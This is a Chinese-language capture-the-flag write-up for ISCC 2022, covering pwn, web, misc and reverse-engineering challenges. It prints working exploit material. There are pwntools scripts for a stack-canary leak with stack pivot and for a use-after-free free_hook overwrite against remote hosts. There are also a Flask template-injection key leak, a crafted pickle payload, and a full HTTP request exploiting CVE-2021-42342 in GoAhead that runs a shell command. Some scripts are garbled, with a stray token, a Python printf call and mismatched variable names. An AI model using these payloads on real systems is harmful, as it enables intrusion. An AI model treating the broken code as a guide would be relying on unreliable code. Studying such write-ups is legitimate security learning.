style=\"margin-left:0;text-align:justify;\">跳一跳：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">Ida打开文件，查看后发现check不到啥，尝试了好久，最后发现为泄露Canary和栈迁移漏洞。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"242\" src=\"..\\..\\static\\image\\9ceb020d6f03487b81b2128c385af744.png\" width=\"567\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">Exp：</p>\n<pre><code>from pwn import *\n\ndef fjl():\n    printf(\"----------------------------------\")\n    printf(\"flag如下：\")\n\ncontext.log_level='debug'\n\nip = remote('123.57.69.203',7020)#题目给的地址\nfp1 = ELF('pwn')#题目给的文件\n\nfp2=ELF('fp2-2.27.so')\n\nip.sendlineafter('Hello CTFer! Welcome to the world of pwn~',str(0x61))\nfor i in range(216):\n    ip.sendline(str(0x61))\nip.send('b')\nip.recvuntil('a'*217)\ncanary=u64(ip.recv(7).rjust(8,'\\x00'))\nrbp=u64(ip.recv(6).ljust(8,'\\x00'))\nlog.info(hex(canary))\nlog.info(hex(rbp))\npayload='a'*216+p64(canary)+p64(0)+p8(0x98)\nip.send(payload)\n\nip.sendlineafter('Hello CTFer! Welcome to the world of pwn~',str(0x61))\nfor i in range(87):\n    ip.sendline(str(0x61))\nip.send('b')\nip.recvuntil('a'*88)\nx=u64(ip.recv(6).ljust(8,'\\x00'))\nlog.info(hex(x))\nfp2_base = x-fp2.symbols['_ip_2_1_stderr_']y\ny= fp2_base+0x4f2c5\npayload = 'a'*216+p64(canary)+p64(0)+p64(y)\nfjl()\nip.send(payload)\n\nip.interactive()</code></pre>\n<h1 id=\"%E6%93%82%E5%8F%B0%E9%A2%98WP%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">擂台题WP：</h1>\n<h2 id=\"MISC%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">MISC：</h2>\n<h3 id=\"666%3A\" style=\"margin-left:0;text-align:justify;\">666:</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">打开后发现一个图片和一个flag的压缩包，不用想压缩包密码一定在图片里，尝试用Stegsolve打开文件查看，发现存在加密，尝试密码爆破，密码为123456，但还是什么都没有，想到可能是高度被改，于是改变了高度，的到密码!@#$%678()_+。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">到这里就卡了好长时间，因为分析不出flag，最后在追踪tpc流时发现了一个网址，尝试访问试一下。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"446\" src=\"..\\..\\static\\image\\5e1b865e50574482a48447e694498eb9.png\" width=\"554\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">网址为：<span style=\"color:#0563c1;\"><u><span style=\"background-color:#fbeded;\"><a href=\"https://www.cnblogs.com/konglingdi/p/14998301.html\" title=\"666 - Kong-lingdi - 博客园\">666 - Kong-lingdi - 博客园</a></span></u></span></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">发现图片666。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"365\" src=\"..\\..\\static\\image\\ca701a6e8c01413c9c21b8e6ef8c658b.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">分析一下得到两个加密。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">图片中有三段加密。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">第一个：SE1ERWtleTo4NTIgOTg3NDU2MzIxIDk4NDIzIDk4NDIzIFJFQUxrZXk6eFN4eA==</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">第二个：pQLKpP/</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">第三个：EPmw301eZRzuYvQ==</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">第一个base64解密得到ISCC，然后以ISCC为秘钥再aes解密第二第三个得到flag。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"290\" src=\"..\\..\\static\\image\\b509c9a3e28d480fb432e40171da9b8c.png\" width=\"554\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"341\" src=\"..\\..\\static\\image\\5e631d50a6df4c1287e18b8f4a1886bb.png\" width=\"554\"/></p>\n<p></p>\n<h2 id=\"Web%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">Web：</h2>\n<h3 id=\"Melody%3A\" style=\"margin-left:0;text-align:justify;\">Melody:</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">发现可以登录，随便登陆进去，找了一会什么都没有，就只有一个session构造。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">但没有key。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">搜目录后有一个info回显。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"161\" src=\"..\\..\\static\\image\\a0e5ec05bf7c4c9dada15d50007cc547.png\" width=\"534\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">在网上看到过可以用?name={<!-- -->{config}}来得到key，这一题有一个Melody，也相当于题的name。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">所以用?Melody={<!-- -->{config}}来得到，config是配置文件，一般用来<span style=\"background-color:#ffffff;\"><span style=\"color:#4d4d4d;\">设置秘钥，设置数据库地址等；</span></span></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"378\" src=\"..\\..\\static\\image\\aaa47c4ab4554ade8944916c1755baf6.png\" width=\"617\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">得到key：<strong>meldoy-is-so-cute-wawawa!</strong></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><strong>利用脚本来伪造session</strong></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"46\" src=\"..\\..\\static\\image\\8aa8d45f363f42cf92206b07a47e0d4a.png\" width=\"567\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">传进session。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"364\" src=\"..\\..\\static\\image\\fd7cf4e180bd4566bcc8d0bcc4bca701.png\" width=\"567\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">发现代码</p>\n<pre><code># -*- coding:utf-8 -*-\n\nimport pickle\n\nimport melody\n\nimport base64\n\nfrom flask import Flask, Response,request\n\n\n\nclass register:\n\n    def __init__(self,name,password):\n\n        self.name = name\n\n        self.password = password\n\n\n\n    def __eq__(self, other):\n\n        return type(other) is register and self.name == other.name and self.password == other.password\n\n\n\n\n\nclass RestrictedUnpickler(pickle.Unpickler):\n\n    def find_class(self, module, name):\n\n        if module[0:8] == '__main__':\n\n            return getattr(sys.modules['__main__'],name)\n\n        raise pickle.UnpicklingError(\"global '%s.%s' is forbidden\" % (module, name))\n\n\n\ndef find(s):\n\n    return RestrictedUnpickler(io.BytesIO(s)).load()\n\n\n\n@app.route('/therealflag', methods=['GET','POST'])\n\ndef realflag():\n\n    if request.method == 'POST':\n\n        try:\n\n            data = request.form.get('melody')\n\n            if b'R' in base64.b64decode(data):\n\n                return 'no reduce'\n\n            else:\n\n                result = find(base64.b64decode(data))\n\n                if type(result) is not register:\n\n                    return 'The type is not correct!'\n\n            correct = ((result == register(melody.name,melody.password))&amp;(result == register(\"melody\",\"hug\")))\n\n            if correct:\n\n                if session['username'] == 'admin':\n\n                    return Response(read('./flag.txt'))\n\n                else:\n\n                    return Response(\"You're not admin!\")\n\n        except Exception as e:\n\n            return Response(str(e))\n\n\n\n    test = register('admin', '123456')\n\n    data = base64.b64encode(pickle.dumps(test)).decode()\n\n    return Response(data)</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\">主要查看@后边的，一种picke反序列化，没接触过。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">网上找了个脚本，稍微修改了一下：</p>\n<pre><code>import base64\ndata=b'''c__main__\nmelody\n(S'name'\nS\"melody\"\nS\"hug\"\nS\"1\"\ndb0(c__main__\nregister\nS\"melody\"\nS\"hug\"\no.\n'''\nprint(base64.b64encode(data))</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">因为是POST传参，所以直接传入</p>\n<pre><code>melody=Y19fbWFpbl9fCm1lbG9keQooUyduYW1lJwpTIm1lbG9keSIKUyJodWciClMiMSIKZGIwKGNfX21haW5fXwpyZWdpc3RlcgpTIm1lbG9keSIKUyJodWciCg==</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"264\" src=\"..\\..\\static\\image\\4e1dd61f65394fb9b343238fcc1e18f4.png\" width=\"567\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">得到flag，交flag时把flag去掉变为ISCC{}格式，ISCC{2022_melody_secrets}。</p>\n<h3 id=\"Ping2rce%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">Ping2rce：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">通过分析http响应头看到了GoAhead，想到了命令执行漏洞。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">考点是GoAhead环境变量注入。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">CVE-2021-42342 GoAhead 远程命令执行漏洞。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><span style=\"color:#0563c1;\"><u><a href=\"https://mp.weixin.qq.com/s/AS9DHeHtgqrgjTb2gzLJZg\" title=\"【最新漏洞预警】CVE-2021-42342 GoAhead 远程命令执行漏洞深入分析与复现（警惕！影响范围广泛）\">【最新漏洞预警】CVE-2021-42342 GoAhead 远程命令执行漏洞深入分析与复现（警惕！影响范围广泛）</a></u></span></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">但跟题目不太相似，题目需要用到ping命令，想到了p神在跳跳糖中发布过的劫持ping执行过程中环境变量注入。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">看了p神的分析，不一样的是p神覆盖的是echo函数，我们只需覆盖ping即可，需要知道的是：不能传入-p参数，不能传入-n参数BASH_DUNC_相当于前十个字符，后两个字符相当于%%，满足if语句后去除前缀后会是一个变量名，以（）开头的字符串将会被执行。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">然后利用bp，POST传入BASH_FUNC_ping%%,内容为：()  { cat /flag: }</p>\n<pre><code>POST /cgi-bin/ping?ip=127.0.0.1 HTTP/1.1\n\nHost: 59.110.169.206:8010\n\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36\n\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.9,application/signed-exchange;v=b3;q=0.8\n\nAccept-Encoding: gzip, deflate\n\nAccept-Language: zh-CN,zh;q=0.8\n\nContent-Type: multipart/form-data:\n\nBoundary=-----------------------------WebKitFormBoundaryAQByxV1hsbqmfWXp\n\nConnection: close\n\n\n\n-----------------------------WebKitFormBoundaryAQByxV1hsbqmfWXp\n\nContent-Disposition: form-data; name=\"BASH_FUNC_ping%%\";\n\n() { cat /flag; }\n\n-----------------------------WebKitFormBoundaryAQByxV1hsbqmfWXp</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\">得到flag为ISCC{c1522169-7dcvd499-4add960-9ad36-8b2a5f2f7}</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<h2 style=\"margin-left:0;text-align:justify;\">PWN：</h2>\n<h3 id=\"Ezuaf%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">Ezuaf：</h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">链接得到文件，将libc-2.27.so放进ida中分析，发现漏洞编写脚本。</p>\n<pre><code>from pwn import *\n\ndef bianji(page, context):\n x.recvuntil(\":\")\n x.sendline(\"2\")\n x.recvuntil(\"Input page\\n\")\n x.sendline(str(page))\n x.recvuntil(\"Input your massage:\")\n x.sendline(context)\n\ndef chuangjian(size):\n x.recvuntil(\":\")\n x.sendline(\"1\")\n x.recvuntil(\"Input size:\")\n x.sendline(str(size))\n\ndef show(page):\n x.recvuntil(\":\")\n x.sendline(\"4\")\n x.recvuntil(\"Input page\\n\")\n x.sendline(str(page))\n\ndef shanchu(page):\n x.recvuntil(\":\")\n x.sendline(\"3\")\n x.recvuntil(\"Input page\\n\")\n x.sendline(str(page))\n\nfp=ELF(\"Ezuaf\")#同一目录下的本题的libc-2.27.so文件，我用题目名字命名。\nx=remote(\"123.57.69.203\", 8020)#连接上网址\nchuangjian(0x410)\nchuangjian(0x20)\nshanchu(0)\nshow(0)\nfp_addr=u64(x.recvuntil('\\x7f').ljust(8, b'\\x00'))-0x3EBCA0\nprint ('fp_addr', hex(fp_addr))\none_gadget=fp_addr+0x4f432\nprint ('one_gadget', hex(one_gadget))\nfree_hook = fp_addr + fp.symbols['__free_hook']\nprint ('free_hook', hex(free_hook))\nchuangjian(0x20)\nshanchu(2)\nbianji(2,p64(free_hook))\nchuangjian(0x20)\nchuangjian(0x20)\nbianji(4,p64(one_gadget))\nshanchu(1)\n\nx.interactive()</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">最后ls和cat flag.txt得到flag。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"551\" src=\"..\\..\\static\\image\\176073f2accd4f52a446f655e6aada2f.png\" width=\"567\"/></p>\n<p></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"></p>\n<h2 id=\"RE%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\">RE：</h2>\n<h3 id=\"Encode%EF%BC%9A\" style=\"margin-left:0;text-align:justify;\"><span style=\"background-color:#ffffff;\"><span style=\"color:#314659;\">Encode</span><span style=\"color:#314659;\">：</span></span></h3>\n<p style=\"margin-left:.0001pt;text-align:justify;\">Mian函数分析：</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"323\" src=\"..\\..\\static\\image\\66ed036f3f924d4f92125cecc6ea796f.png\" width=\"554\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">对加密的逻辑分析一下：首先对data进行了xor处理，</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">然后获取密钥，然后是模运算。</p>\n<p style=\"margin-left:.0001pt;text-align:justify;\"><img alt=\"\" height=\"324\" src=\"..\\..\\static\\image\\02b7588639e0497dbbb7be11e7f33648.png\" width=\"554\"/></p>\n<p style=\"margin-left:.0001pt;text-align:justify;\">写脚本解密即可：</p>\n<pre><code>Exp：\n\ndef fjl2(a, b, x, y):\n    sun = 0\n    if b:\n        sun = fjl2(b, a % b, y, x)\n        y -= a / b * x\n    else:\n        x = 1\n        y = 0\n        return a\n    return sum\n\ndef fjl1(z, fjl):\n    y, x, d = 0, 0, 0\n    d = fjl2(z, fjl, x, y)\n    if d == 1:\n        return (x % fjl + fjl) % fjl\n    else:\n        return -1\n#主代码。\nFlag = ''\n\ntest = [0x23, 0x4A, 0x7, 0x2B, 0x1D, 0x6, 0x3F, 0x36, 0x36, 0x2B, 0x5, 0x7, 0x6, 0x39, 0x2, 0x6, 0x38, 0x21, 0x4B, 0x1A,0x2D, 0x2D, 0x39, 0x2]\nk = [0] * 10\nk[0], k[1], k[2] = [0x7, 0xb, 0xd]\nk[3] = k[1] * k[0]\nk[4] = (k[1] - 1) * (k[0] - 1)\nk[5] = fjl1(k[2], k[4])\nshuju = [0] * 24\nfor i in range(24):\n    for j in range(1, 1000):\n        if test[i] == pow(j, k[2], k[3]):\n            shuju[i] = j\n            break\nfor j in range(len(shuju)):\n    shuju[j] += 70\n    shuju[j] ^= 0x3f\nlen1= len(shuju)\nfor i in range((len(shuju)%2 + len(shuju))//2,-1,-1):\n    shuju[len1 - i - 1] ^= shuju[i]\n    shuju[i] ^= shuju[len1-i-1]\n    shuju[len1 - i - 1] ^= shuju[i]\nfor i in range(len1):\n    Flag += chr(shuju[i] ^ 0xf)\nprint(Flag)</code></pre>\n<p style=\"margin-left:.0001pt;text-align:justify;\">flag为ISCC{PWN_ISR_EALLY_HARD}</p>\n</div>\n</div>", "first_tag": "PHP", "cpp": 0, "csharp": 0, "python": 1, "javascript": 0, "java": 0, "sql": 1, "php": 1, "time": "2022-06-14 23:40:14", "summary": "目录解题步骤及过程：练武题：冬奥会：爱国敬业好青年：：这是一道代码审计题：：：让我康康：：冬奥会：单板小将苏翊鸣：隐秘的信息：藏在星空中的诗：藏在星空中的诗：降维打击：真相只有一个：：：：：：：：：："}